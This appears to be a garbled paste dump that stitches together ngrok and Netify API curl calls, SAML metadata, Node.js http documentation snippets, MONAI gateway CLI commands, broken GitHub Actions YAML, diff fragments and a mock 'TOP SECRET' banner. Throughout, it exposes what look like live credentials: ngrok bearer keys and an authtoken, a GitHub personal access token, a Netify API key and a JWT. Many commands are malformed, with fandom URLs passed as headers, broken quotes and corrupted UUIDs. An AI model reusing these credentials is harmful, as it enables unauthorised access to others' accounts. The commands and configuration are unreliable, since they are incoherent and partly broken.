validUntil="2020-09-14T12:53:23.691Z" cacheDuration="PT1M" entityID="http://127.0.0.1:12345/metadata\"\u003e\u003cIDPSSODescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"\u003e\u003cNameIDFormat\u003eurn:oasis:names:tc:SAML:2.0:nameid-format:transient\u003c/NameIDFormat\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003c/IDPSSODescriptor\u003e\u003c/EntityDescriptor\u003e\n", "force_authn": false, "allow_idp_initiated": true, "authorized_groups": [], "entity_id": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "assertion_consumer_service_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/acs", "single_logout_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/slo", "request_signing_certificate_pem": "-----BEGIN CERTIFICATE-----\nMIIEBDCCAuygAwIBAgIRAOT8A8TGFjL7kvO/m0bVKR8wDQYJKoZIhvcNAQELBQAw\ngaAxTjBMBgNVBAoMRWh0dHBzOi8vaWRwLmxvY2FsLW5ncm9rLmNvbS9zYW1sL2Vk\nZ2h0c3J0XzJiTW1YRmthUFRMRTl4eVhUVFR4aWdCUlJFTjFOMEwGA1UEAwxFaHR0\ncHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3NhbWwvZWRnaHRzcnRfMmJNbVhGa2FQ\nVExFOXh5WFRUVHhpZ0JSUkVOMCAXDTI0MDEyMzE4MDkxOVoYDzIwNTkwMTE0MTgw\nOTE5WjCBoDFOMEwGA1UECgxFaHR0cHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3Nh\nbWwvZWRnaHRzcnRfMmJNbVhGa2FQVExFOXh5WFRUVHhpZ0JSUkVOMU4wTAYDVQQD\nDEVodHRwczovL2lkcC5sb2NhbC1uZ3Jvay5jb20vc2FtbC9lZGdodHNydF8yYk1t\nWEZrYVBUTEU5eHlYVFRUeGlnQlJSRU4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw\nggEKAoIBAQCvvcWPTZy3bIjnFSZfEPwGwZcOzkNnIQrNlX5v7SsucJHCxtCNKt9B\nzi6HTcRteOGEydVOr3Lg8MX8DdEecOt4e0Hf0NeChbX1gYsS1b2+0Q9sf9sH7fu1\n1F5y7zOlVRvWjuars3HVYqGQkTBATAcqkvUuUJeHzyWleQ8CXL3Ixp2TcJa/7fsz\njW2Heg4CX6Lx3E3Z6cGh2hFi1VFuKdeAufgZGbAbIBUpAnMAwMdJI/MLp3D4fHQv\n0VCwdXKhWt+SvidWVBg2Tv97phncbNMPNVi6VERO8+n7A5qdHG9efGnOTrLnxzJu\n97AfRBU8I88kdy4trPy9xeFBwnvlnlhZAgMBAAGjNTAzMA4GA1UdDwEB/wQEAwIH\ngDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB\nCwUAA4IBAQAWA4t3JKL1cjV+CO+doaad/QhlbfW+tbI2n3tuRlrvZWtJKATuKFBZ\nFOqp20EfaeOgtMyDRDU8UNLoMWVT8zNUmzh4MtkrBQkUplPCuBHf844gJtDJdcA8\nxFj/vJyuET18b7fn4ppPG6RAqwH5nbAQ18zbKr8MgEWK0YbX4Wb+3fZVRfbKMFPp\nGs9CoZyC/Tz0z50xI3Am4d8QxibQQOinAuPQk6HcyP5Eg+bdUrBYTEdWircNZ1Hs\nDVIblwsbQ7TvDp+qtzyVjbtwa8yLBSlPRXkoYaXKhU9ziIYT1GIqrhV2KNO8qXn7\nGNTnpMopy0wcdJ05v4S12jFaKFknbvTv\n-----END CERTIFICATE-----\n", "metadata_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "nameid_format": "urn:oasis:names:tc:SAML:2.0:nameid-format:persistent" } curl -X PUT -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"idp_metadata":"\n\u003cEntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2020-09-14T12:53:23.691Z" cacheDuration="PT1M" entityID="http://127.0.0.1:12345/metadata\"\u003e\u003cIDPSSODescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"\u003e\u003cNameIDFormat\u003eurn:oasis:names:tc:SAML:2.0:nameid-format:transient\u003c/NameIDFormat\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003c/IDPSSODescriptor\u003e\u003c/EntityDescriptor\u003e\n"}' https://api.ngrok.com/edges/https/edghts_2bMmXGZh5RnDO7bAgszNuVae4M3/routes/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/saml { "enabled": true, "options_passthrough": false, "cookie_prefix": "", "inactivity_timeout": 0, "maximum_duration": 0, "idp_metadata_url": "", "idp_metadata": "\n\u003cEntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2020-09-14T12:53:23.691Z" cacheDuration="PT1M" entityID="http://127.0.0.1:12345/metadata\"\u003e\u003cIDPSSODescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"\u003e\u003cNameIDFormat\u003eurn:oasis:names:tc:SAML:2.0:nameid-format:transient\u003c/NameIDFormat\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003cSingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" Location="http://127.0.0.1:12345/sso\"\u003e\u003c/SingleSignOnService\u003e\u003c/IDPSSODescriptor\u003e\u003c/EntityDescriptor\u003e\n", "force_authn": false, "allow_idp_initiated": true, "authorized_groups": [], "entity_id": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "assertion_consumer_service_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/acs", "single_logout_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN/slo", "request_signing_certificate_pem": "-----BEGIN CERTIFICATE-----\nMIIEBDCCAuygAwIBAgIRAOT8A8TGFjL7kvO/m0bVKR8wDQYJKoZIhvcNAQELBQAw\ngaAxTjBMBgNVBAoMRWh0dHBzOi8vaWRwLmxvY2FsLW5ncm9rLmNvbS9zYW1sL2Vk\nZ2h0c3J0XzJiTW1YRmthUFRMRTl4eVhUVFR4aWdCUlJFTjFOMEwGA1UEAwxFaHR0\ncHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3NhbWwvZWRnaHRzcnRfMmJNbVhGa2FQ\nVExFOXh5WFRUVHhpZ0JSUkVOMCAXDTI0MDEyMzE4MDkxOVoYDzIwNTkwMTE0MTgw\nOTE5WjCBoDFOMEwGA1UECgxFaHR0cHM6Ly9pZHAubG9jYWwtbmdyb2suY29tL3Nh\nbWwvZWRnaHRzcnRfMmJNbVhGa2FQVExFOXh5WFRUVHhpZ0JSUkVOMU4wTAYDVQQD\nDEVodHRwczovL2lkcC5sb2NhbC1uZ3Jvay5jb20vc2FtbC9lZGdodHNydF8yYk1t\nWEZrYVBUTEU5eHlYVFRUeGlnQlJSRU4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw\nggEKAoIBAQCvvcWPTZy3bIjnFSZfEPwGwZcOzkNnIQrNlX5v7SsucJHCxtCNKt9B\nzi6HTcRteOGEydVOr3Lg8MX8DdEecOt4e0Hf0NeChbX1gYsS1b2+0Q9sf9sH7fu1\n1F5y7zOlVRvWjuars3HVYqGQkTBATAcqkvUuUJeHzyWleQ8CXL3Ixp2TcJa/7fsz\njW2Heg4CX6Lx3E3Z6cGh2hFi1VFuKdeAufgZGbAbIBUpAnMAwMdJI/MLp3D4fHQv\n0VCwdXKhWt+SvidWVBg2Tv97phncbNMPNVi6VERO8+n7A5qdHG9efGnOTrLnxzJu\n97AfRBU8I88kdy4trPy9xeFBwnvlnlhZAgMBAAGjNTAzMA4GA1UdDwEB/wQEAwIH\ngDATBgNVHSUEDDAKBggrBgEFBQcDATAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEB\nCwUAA4IBAQAWA4t3JKL1cjV+CO+doaad/QhlbfW+tbI2n3tuRlrvZWtJKATuKFBZ\nFOqp20EfaeOgtMyDRDU8UNLoMWVT8zNUmzh4MtkrBQkUplPCuBHf844gJtDJdcA8\nxFj/vJyuET18b7fn4ppPG6RAqwH5nbAQ18zbKr8MgEWK0YbX4Wb+3fZVRfbKMFPp\nGs9CoZyC/Tz0z50xI3Am4d8QxibQQOinAuPQk6HcyP5Eg+bdUrBYTEdWircNZ1Hs\nDVIblwsbQ7TvDp+qtzyVjbtwa8yLBSlPRXkoYaXKhU9ziIYT1GIqrhV2KNO8qXn7\nGNTnpMopy0wcdJ05v4S12jFaKFknbvTv\n-----END CERTIFICATE-----\n", "metadata_url": "https://idp.local-ngrok.com/saml/edghtsrt_2bMmXFkaPTLE9xyXTTTxigBRREN", "nameid_format": "urn:oasis:names:tc:SAML:2.0:nameid-format:persistent" }

          #000006 $ Breadcrumbs X 4
### ++ Sigma 9 ++
          #000006 $ Breadcrumbs X 4
HANDLE CreateFileA( [in] LPCSTR lpFileName, [in] DWORD dwDesiredAccess, [in] DWORD dwShareMode, [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes, [in] DWORD dwCreationDisposition, [in] DWORD dwFlagsAndAttributes, [in, optional] HANDLE hTemplateFile ); typedef struct _SECURITY_DESCRIPTOR { BYTE Revision; BYTE Sbz1; SECURITY_DESCRIPTOR_CONTROL Control; PSID Owner; PSID Group; PACL Sacl; PACL Dacl; } SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;

{ "content-length": "123", "content-type": "text/plain", "connection": "keep-alive", "host": "example.com", "accept": "/" } [ 'ConTent-Length', '123456', 'content-LENGTH', '123', 'content-type', 'text/plain', 'CONNECTION', 'keep-alive', 'Host', 'example.com', 'accepT', '/' ] http.get(options, (res) => { // Do stuff }).on('socket', (socket) => { socket.emit('agentRemove'); });

http.get({ hostname: 'localhost', port: 80, path: '/', agent: false, // Create a new agent just for this one request }, (res) => { // Do stuff with response }); Configures API endpoint $ mig config --endpoint HTTP://localhost:5000 import { Agent, request } from 'node:http'; const keepAliveAgent = new Agent({ keepAlive: true }); options.agent = keepAliveAgent; request(options, onResponseCallback); socket.setKeepAlive(true, this.keepAliveMsecs); socket.unref(); return true; socket.ref(); import { createServer, request } from 'node:http'; import { connect } from 'node:net'; import { URL } from 'node:url';

// Create an HTTP tunneling proxy const proxy = createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('okay'); }); proxy.on('connect', (req, clientSocket, head) => { // Connect to an origin server const { port, hostname } = new URL(http://${req.url}); const serverSocket = connect(port || 80, hostname, () => { clientSocket.write('HTTP/1.1 200 Connection Established\r\n' + 'Proxy-agent: Node.js-Proxy\r\n' + '\r\n'); serverSocket.write(head); serverSocket.pipe(clientSocket); clientSocket.pipe(serverSocket); }); });

// Now that proxy is running proxy.listen(1337, '127.0.0.1', () => {

// Make a request to a tunneling proxy const options = { port: 1337, host: '127.0.0.1', method: 'CONNECT', path: 'www.google.com:80', };

const req = request(options); req.end();

req.on('connect', (res, socket, head) => { console.log('got connected!');

// Make a request over an HTTP tunnel
socket.write('GET / HTTP/1.1\r\n' +
             'Host: www.google.com:80\r\n' +
             'Connection: close\r\n' +
             '\r\n');
socket.on('data', (chunk) => {
  console.log(chunk.toString());
});
socket.on('end', () => {
  proxy.close();
});
}); });

import { request } from 'node:http';

const options = { host: '127.0.0.1', port: 8080, path: '/length_request', };

// Make a request const req = request(options); req.end();

req.on('information', (info) => { console.log(Got information prior to main response: ${info.statusCode}); });

import http from 'node:http'; import process from 'node:process';

// Create an HTTP server const server = http.createServer((req, res) => { res.writeHead(200, { 'Content-Type': 'text/plain' }); res.end('okay'); }); server.on('upgrade', (req, socket, head) => { socket.write('HTTP/1.1 101 Web Socket Protocol Handshake\r\n' + 'Upgrade: WebSocket\r\n' + 'Connection: Upgrade\r\n' + '\r\n');

socket.pipe(socket); // echo back });

// Now that server is running server.listen(1337, '127.0.0.1', () => {

// make a request const options = { port: 1337, host: '127.0.0.1', headers: { 'Connection': 'Upgrade', 'Upgrade': 'websocket', }, };

const req = http.request(options); req.end();

req.on('upgrade', (res, socket, upgradeHead) => { console.log('got upgraded!'); socket.end(); process.exit(0); }); }); request.setHeader('content-type', 'text/html'); request.setHeader('Content-Length', Buffer.byteLength(body)); request.setHeader('Cookie', ['type=ninja', 'language=javascript']); const contentType = request.getHeader('Content-Type'); // 'contentType' is 'text/html' const contentLength = request.getHeader('Content-Length'); // 'contentLength' is of type number const cookie = request.getHeader('Cookie'); // 'cookie' is of type string[]

request.setHeader('Foo', 'bar'); request.setHeader('Cookie', ['foo=bar', 'bar=baz']);

const headers = request.getHeaders(); // headers === { foo: 'bar', 'cookie': ['foo=bar', 'bar=baz'] }

request.setHeader('Foo', 'bar'); request.setHeader('Set-Cookie', ['foo=bar', 'bar=baz']);

const headerNames = request.getRawHeaderNames(); // headerNames === ['Foo', 'Set-Cookie'] const hasContentType = request.hasHeader('content-type'); import http from 'node:http';

// Server has a 5 seconds keep-alive timeout by default http .createServer((req, res) => { res.write('hello\n'); res.end(); }) .listen(3000);

setInterval(() => { // Adapting a keep-alive agent http.get('http://localhost:3000', { agent }, (res) => { res.on('data', (data) => { // Do nothing }); }); }, 5000); // Sending request on 5s interval so it's easy to hit idle timeout import http from 'node:http'; const agent = new http.Agent({ keepAlive: true });

function retriableRequest() { const req = http .get('http://localhost:3000', { agent }, (res) => { // ... }) .on('error', (err) => { // Check if retry is needed if (req.reusedSocket && err.code === 'ECONNRESET') { retriableRequest(); } }); }

retriableRequest(); request.setHeader('Content-Type', 'application/json'); request.setHeader('Cookie', ['type=ninja', 'language=javascript']); request.setHeader('Cookie', ['type=ninja', 'language=javascript']); const filename = 'Rock 🎵.txt'; request.setHeader('Content-Disposition', attachment; filename*=utf-8''${encodeURIComponent(filename)}); import http from 'node:http'; const options = { host: 'www.google.com', }; const req = http.get(options); req.end(); req.once('response', (res) => { const ip = req.socket.localAddress; const port = req.socket.localPort; console.log(Your IP address is ${ip} and your source port is ${port}.); // Consume response object }); server.on('clientError', (err, socket) => { if (err.code === 'ECONNRESET' || !socket.writable) { return; }

socket.end('HTTP/1.1 400 Bad Request\r\n\r\n'); });

Start the MONAI Informatics Gateway with custom configuration

$ mig start

Restart the MONAI Informatics Gateway

$ mig restart [-y | --yes]

Stop the MONAI Informatics Gateway

$ mig stop [-y | --yes]

Add (SCP) AE Title (with optional application mapping)

$ mig aet add [-n NAME] -a AE_TITLE [--apps liver,brain,ABC123]

Delete (SCP) AE Title

$ mig aet rm -n NAME

List all (SCP) AE Title

$ mig aet ls

Add DICOM Source for SCP

$ mig source add [-n NAME] -a AE_TITLE -i HOSTNAME_IP

Delete DICOM Source of SCP

$ mig source rm -n NAME

List all DICOM Sources of SCP

$ mig source ls

Add DICOM Destination for Clara SCU

$ mig dest add [-n NAME] -a AE_TITLE -i HOSTNAME_IP -N NAME -p PORT

Delete DICOM Destination of SCU

$ mig dest rm -n NAME

List all DICOM Destinations of SCU

$ mig dest ls

Get MONAI Informatics Gateway health and status

$ mig status

name: Reusable deploy workflow on: workflow_call: inputs: build_id: required: true type: number deploy_target: required: true type: string perform_deploy: required: true type: boolean

jobs: deploy: runs-on: ubuntu-latest if: {{ inputs.build_id }} --target ${{ inputs.deploy_target }}

first tunnel 'edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL' first tunnel 'edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL' ngrok tunnel --region us --label edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL 22 ngrok tunnel --region us --label edge=edgtcp_2asv5WFM8HsADOTMkpzdtM0KrpL 22 header 'bkdtg_2b0vwsM7nbkREHxg8bDHm81vzXe' header 'bkdtg_2b0vwsM7nbkREHxg8bDHm81vzXe' @@ -22801,33 +22826,4 @@ curl --location --request GET 'https://informatics.netify.ai/api/v1/intelligence }' }'

... ... "data_info" "data_info" name: Build and deploy on: push

jobs: build: runs-on: ubuntu-latest outputs: build_id: ${{ steps.build_step.outputs.build_id }} steps: - uses: actions/checkout@v4 - name: Build id: build_step run: | ./build echo "build_id=$BUILD_ID" >> {{ needs.build.outputs.build_id }} debug: needs: [build, deploy] runs-on: ubuntu-latest if: ${{ failure() }} steps: - uses: actions/checkout@v4 - run: ./debug

curl --request POST
--url "https://api.github.com/applications/YOUR_CLIENT_ID/token"
--user "YOUR_CLIENT_ID:YOUR_CLIENT_SECRET"
--header "Accept: application/vnd.github+json"
--header "X-GitHub-Api-Version: 2022-11-28"
--data '{ "access_token": "’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’" }'

Output # Output

dist/ dist/

@@ -8,4 +20,4 @@ node_modules/ ..sw? ..sw? *~ *~ *# *# 228d0c98cf585154e5a2b9dc0676711ed9225944 228d0c98cf585154e5a2b9dc0676711ed9225944 494 changes: 494 additions & 0 deletions 494
.prettierrc.toml

@@ -1,3 +1,497 @@ DORIAN/GAMBIT/HEXAGON /RUFT/UMBRA HANDLE VIA BYEMAN TALENT-KEYHOLE -TOP SECRET CONTROL SYSTEMS JOINTLY

{ "image": "mcr.microsoft.com/devcontainers/universal:2", "features": { } }

https://codespaces.new/6309304695/sigma-3/pull/17?quickstart=1 Sigma-10

      #000006
image

Infomatics Developer Token eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3BvcnRhbC5uZXRpZnkuYWkvbG9naW4iLCJpYXQiOjE3MDUxMzY4MzUsImV4cCI6MTcwNTc0MTYzNSwibmJmIjoxNzA1MTM2ODM1LCJqdGkiOiJ5YUJSNmVaNHowazdmeWVPIiwicm9sZXMiOlsidXNlciJdfQ.D76SvBw4n1cE-uvKaXgEQejvT4lFtYTVI_CI3rfW9jE

$ NGROK cert_2arwYf0cqnJGX9y1yw4Ky2ZQRAe

https://manager.netify.ai/api/v1/assets/sites

curl --location 'https://manager.netify.ai/api/v1/assets/agents' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://manager.netify.ai/api/v1/assets/agents/CH-AM-BE-RS' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location --request POST 'https://manager.netify.ai/api/v1/assets/agents/EX-AM-PL-ES?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location --request DELETE 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{e8197a53-28ed-4f30-82ac-2443940739b8}}&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{dfb33af7_fa5a_4920_a4d4_e7742b273246}}&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA/provision?mode=in-site&label=North%20Wing&organization_uuid={{e8197a53-28ed-4f30-82ac-2443940739b8}}&site_uuid=00000000_0000_0000_0000_000000000000&site_label=Toronto%20Office&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request POST 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA/provision?mode=in-site&label=North%20Wing&organization_uuid={{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}&site_uuid=00000000_0000_0000_0000_000000000000&site_label=Toronto%20Office&plan_id=1000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location --request PATCH 'https://manager.netify.ai/api/v1/assets/agents/AA-AA-AA-AA?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://manager.netify.ai/api/v1/assets/sites/00000000_0000_0000_0000_000000000000' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://manager.netify.ai/api/v1/assets/sites' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

https://manager.netify.ai/api/v1/assets/sites?label=CPE1&organization_uuid={{e8197a53-28ed-4f30-82ac-2443940739b8}}&plan_id=1000000

curl --location --request PATCH 'https://manager.netify.ai/api/v1/assets/sites/00000000_0000_0000_0000_000000000000?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g 'https://manager.netify.ai/api/v1/assets/organizations/{{e8197a53-28ed-4f30-82ac-e8197a53-28ed-4f30-82ac-2443940739b}}' --header 'ak_2atIkJzKro4NLf7fn2yV6RNd'

curl --location -g 'https://manager.netify.ai/api/v1/assets/organizations/{{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}' --header 'ak_2atIkJzKro4NLf7fn2yV6RNd'

curl --location --request POST 'https://manager.netify.ai/api/v1/assets/organizations?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request PATCH 'https://manager.netify.ai/api/v1/assets/organizations/{{e8197a53-28ed-4f30-82ac-2443940739b8}}?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g --request PATCH 'https://manager.netify.ai/api/v1/assets/organizations/{{dfb33af7_fa5a_4920_a4d4_e7742b2732460}}?label=CPE1' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/aggregate?filter_interval=1440' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator'/ --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/datatable/application' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/scorecard/application/download?filter_interval=1440' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/summary' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/summary' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/stats/top/application/download' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location 'https://informatics.netify.ai/api/v1/data/flows/lookup/6285544?filter_interval=1440' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g 'https://informatics.netify.ai/api/v1/data/flows/stream?filter_start_date=1574705594&filter_end_date=1574791994&filter_fields=[%22fandom.com%22]&filter_required_fields=[%22hfandom.com%22]' --header 'https://scpf-foundation-roblox.fandom.com/wiki/The_Administrator' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd'

curl --location -g 'https://informatics.netify.ai/api/v1/event/events?filter_event_categories=[0]&filter_event_basename=agent.online&filter_event_severity=5' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'x-net-organization: 'dfb33af7_fa5a_4920_a4d4_e7742b2732460' --header 'e8197a53-28ed-4f30-82ac-2443940739b8'

curl --location 'https://informatics.netify.ai/api/v1/identity/devices/options' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request POST 'https://informatics.netify.ai/api/v1/identity/device_macs?device_id=2&mac=f8%3A8f%3Aca%3A10%3Ac3%3Aff&label=-' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request PATCH 'https://informatics.netify.ai/api/v1/identity/device_macs/f8:8f:ca:10:c3:dd?label=Intel%20GB' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location 'https://informatics.netify.ai/api/v1/identity/owners/options' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location 'https://informatics.netify.ai/api/v1/identity/owners/options' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246' --header 'e8197a53-28ed-4f30-82ac-2443940739b8'

curl --location 'https://informatics.netify.ai/api/v1/identity/owners' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request POST 'https://informatics.netify.ai/api/v1/identity/owners?first_name=Keith&last_name=Bieszczat' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

curl --location --request PATCH 'https://informatics.netify.ai/api/v1/identity/owners/1004?last_name=Bieszczat%20III' --header 'ak_2atI9ikJZKro4NLf7fnt2yV6RNd' --header 'e8197a53-28ed-4f30-82ac-2443940739b8' --header 'dfb33af7_fa5a_4920_a4d4_e7742b273246'

OVERSEER-GRATEFUL345I

#000006

Breadcrumbs OVERSEER-GRATEFUL345i

#000006

Breadcrumbs

curl
-X POST -H "Authorization: Bearer {ak_2as1ORVjKAxTVjur5LeHun5z690}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"domain":"myapp.mydomain.com","region":"us","certificate_id":"cert_2arwYf0cqnJGX9y1yw4Ky2ZQRAe"}' https://api.ngrok.com/reserved_domains

apiVersion: v1 kind: Secret metadata: name: github-webhook-secret type: Opaque data: secret-token: ""

kind: NgrokModuleSet apiVersion: ingress.k8s.ngrok.com/v1alpha1 metadata: name: ngrok-module-set modules: webhookVerification: provider: twilio secret: name: "{twilio webhook secret}" key: secret-token

apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: example-ingress annotations: k8s.ngrok.com/modules: ngrok-module-set spec: ingressClassName: ngrok rules: - host: your-domain.ngrok.app http: paths: - path: / pathType: Prefix backend: service: name: example-service port: number: 80 curl -X PUT -H "Authorization: Bearer {ak_2as1ORVjKAxTVjur5LeHun5z690} -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"enabled":true,"provider":"TWILIO","secret":"secret_token"}' https://api.ngrok.com/edges/https/edghts_2arwcDuk0T3vQ5nfcBxHwQrWqDj/routes/edghtsrt_2arwcCYIWJyPRtsZRV7Sghgiuf1/webhook_verification

curl -X POST -H "Authorization: Bearer {ak_2as1ORVjKAxTVjur5LeHun5z690}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"description":"acme http response","metadata":"{"environment": "staging"}","body":"I'm a teapot","headers":{"Content-Type":"text/plain"},"status_code":418}' https://api.ngrok.com/backends/http_response

curl -X GET -H "Authorization: Bearer {ak_2as10RVjKAxTVjur5LeHun5z690" -H "Ngrok-Version: 2" https://api.ngrok.com/backends/http_response curl -X PATCH -H "Authorization: Bearer {ak_2as10RVjKAxTVjur5LeHun5z690}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"metadata":"{"environment": "production"}"}' https://api.ngrok.com/backends/http_response/bkdhr_2arwbYL24DTjjLNbzoWwXKdz7de

ngrok start Grateful 004w ngrok start --all

heroic-enabled-rabbit.ngrok-free.app

$ user id ngrok rd_2asmxxNHyOXQAus3lHS36FxmW1s brew install ngrok/ngrok/ngrok

ngrok config add-authtoken 2aslA7HLp3VGylwfuqpmwGCt60k_64xKZUycstgf5azyo1tHD

ngrok http 80

$ ngrok http 80

ngrok config edit

version: 2

